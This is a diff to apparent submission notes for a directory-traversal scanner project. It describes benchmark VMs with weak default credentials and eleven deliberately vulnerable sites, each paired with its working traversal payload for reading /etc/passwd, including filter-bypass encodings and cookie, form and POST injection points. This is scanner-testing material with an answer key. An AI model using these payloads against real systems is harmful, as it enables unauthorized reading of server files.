@@ -4,8 +4,8 @@ Contains:	scanner, results + outputs on public benchmark & own benchmark
 MD5-Hash:	
 
 Credentials:
-	Username:
-	Password:
+	Username:auditor
+	Password:auditor
 
 Scanner Details:
 	Source code location:
@@ -42,14 +42,82 @@ Scanner Details:
 
 
 
-
 VM2
 Contains:	group 12 benchmark and documentation
 
 MD5-Hash:
 
 Credentials:
-	Username:
-	Password:
+	Username:user
+	Password:user
+
+Details:
+	Each benchmark is located under an "ownX" folder in /var/www/, "X" represents the number of the benchmark.
+	We have 11 benchmark in total, hence in /var/www/ there will be "own1" to "own11" folders.
+	The vulnerability of each benchmark is in a README file under their specific folders, for instance:
+		own1 vulnerability is under /var/www/own1.com/public_html/README
+	We also included the vulnerability for each benchmark below for reference:
+		own1:
+			To get passwd:	..././..././..././..././..././/etc/passwd
+		
+		own2:
+			Front-end JavaScript blocks ../, but the DT is through the Language. (../../../../etc/passwd)
+	
+		own3:
+			The 2 variables append to each other: (GET REQUEST)
+			path=../../../../
+			file=/etc/passwd
+	
+		own4:
+			COOKIE value is suppose to be set minimally:
+			../../../../../../../../../../../../etc/passwd
+			Printed at Page 11
+		own5:
+			passwd file printed in iframe. The form input is:
+			../../../../etc/passwd
+		
+		own6:
+			No DT here. Test-case for False positive
+		
+		own7:	
+			Username: own7
+			Password: own7
+			$_COOKIE["UserDetails"] = '../../../../..//etc/passwd';
+		
+		own8:
+			Hidden Variable in form:
+			hiddenvalue
+			Value:
+			../../../../..//etc/passwd
+		
+		own9:
+			Post Variables:
+			$_POST['FILE_PATH'] = "../../../../../..//etc/passwd";
+			$_FILES['file']['name'] = "";
+
+		own10:
+			Cannot use '../'
+			Use '..%2F' instead
+			..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+		own11:
+			Log into admin to do file traversal
+			User: admin
+			Password: admin
+			Other account:
+			User: user
+			Password: user
+			../../../../../etc/passwd
+			
+
+
+		
+
+
+			
+
+			
+
+	
 
 
